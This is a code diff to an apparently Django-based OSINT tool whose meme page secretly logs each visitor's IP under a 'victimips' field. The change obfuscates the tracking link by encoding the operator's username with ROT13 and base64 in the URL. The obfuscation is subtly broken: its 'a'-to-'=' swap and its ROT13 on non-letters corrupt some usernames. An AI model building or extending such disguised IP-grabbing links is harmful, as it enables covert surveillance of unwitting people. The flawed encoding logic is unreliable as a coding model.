@@ -23,6 +23,7 @@ from .modules.ip.censys import censys_ip
 from .modules.ip.shodan import shodan_ip
 from .modules.btc.btc import btcaddress
 from .modules.email.emailrep import emailrep
+import base64
 import sys, os,requests
 import pdfx
 from io import BufferedReader
@@ -330,8 +331,11 @@ def meme(request, username):
     img = (requests.get("https://meme-api.herokuapp.com/gimme"))
     imgurl = img.json()
     imgurl = imgurl['url']
-  user = User.objects.filter(username=username).first()
-
+  secret=str(str(request.META['PATH_INFO']).split('/')[-1]).replace('a','=')
+  secret=base64.b64decode(secret)
+  secret=secret.decode('ascii')
+  secret="".join(["abcdefghijklmnopqrstuvwxyz"[("abcdefghijklmnopqrstuvwxyz".find(c)+13)%26] for c in secret])
+  user = User.objects.filter(username=secret).first()
   if user.profile.victimips == '':
     user.profile.victimips = ip
   elif ip in user.profile.victimips:
@@ -356,7 +360,11 @@ def tracker(request):
 
     username = request.user.username
     user = User.objects.filter(username=username).first()
-    url = str(request.META['HTTP_HOST'])+'/meme/' + str((username))
+    secret="".join(["abcdefghijklmnopqrstuvwxyz"[("abcdefghijklmnopqrstuvwxyz".find(c)+13)%26] for c in str(username)])
+    secret=base64.b64encode(str(secret).encode('ascii'))
+    if "=" in str(secret.decode('ascii')):
+          secret=str(secret.decode('ascii')).replace('=','a')
+    url = "https://"+str(request.META['HTTP_HOST'])+'/meme/' + str(secret)
     
     victimips = user.profile.victimips
     victimips = victimips.split(',')
